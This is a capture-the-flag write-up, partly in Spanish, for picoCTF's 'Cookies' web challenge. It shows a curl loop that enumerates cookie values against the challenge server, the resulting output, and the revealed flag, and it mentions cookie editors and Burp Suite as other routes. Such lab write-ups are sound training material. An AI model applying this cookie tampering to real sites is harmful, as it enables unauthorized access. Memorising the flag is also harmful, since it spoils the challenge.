## Objetivo
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:17781/](http://mercury.picoctf.net:17781/)
## Solución
```
┌──(jhow㉿DESKTOP-Q5FQ7BC)-[~]
└─$ for i in {1..20}; do curl http://mercury.picoctf.net:17781/check -H "Cookie: name=$i"; done | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1780  100  1780    0     0    214      0  0:00:08  0:00:08 --:--:--   320
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1780  100  1780    0     0    134      0  0:00:13  0:00:13 --:--:--   461
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1776  100  1776    0     0    213      0  0:00:08  0:00:08 --:--:--   411
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1776  100  1776    0     0    214      0  0:00:08  0:00:08 --:--:--   384
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1779  100  1779    0     0    214      0  0:00:08  0:00:08 --:--:--   460
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1777  100  1777    0     0    213      0  0:00:08  0:00:08 --:--:--   421
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1771  100  1771    0     0    208      0  0:00:08  0:00:08 --:--:--   453
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1774  100  1774    0     0    212      0  0:00:08  0:00:08 --:--:--   404
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1770  100  1770    0     0    168      0  0:00:10  0:00:10 --:--:--   304
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1774  100  1774    0     0    213      0  0:00:08  0:00:08 --:--:--   424
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1772  100  1772    0     0    213      0  0:00:08  0:00:08 --:--:--   382
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1772  100  1772    0     0    208      0  0:00:08  0:00:08 --:--:--   432
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1774  100  1774    0     0    211      0  0:00:08  0:00:08 --:--:--   385
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1770  100  1770    0     0    194      0  0:00:09  0:00:09 --:--:--   376
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1776  100  1776    0     0    196      0  0:00:09  0:00:09 --:--:--   378
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1774  100  1774    0     0    212      0  0:00:08  0:00:08 --:--:--   424
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1771  100  1771    0     0    204      0  0:00:08  0:00:08 --:--:--   442
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1184  100  1184    0     0    133      0  0:00:08  0:00:08 --:--:--   243
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}</code></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1774  100  1774    0     0    208      0  0:00:08  0:00:08 --:--:--   396
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1773  100  1773    0     0    214      0  0:00:08  0:00:08 --:--:--   380
```
## Notas adicionales
+ hay tres formas de resolver este reto, el primero es el que se mostro en la solución, el segundo es desde la pagina web, con un editor de cookies cambiar el valor de la cookie hasta dar con la que nos muestra la bandera; y la tercera es utilizando el burpsuite.

## Referencias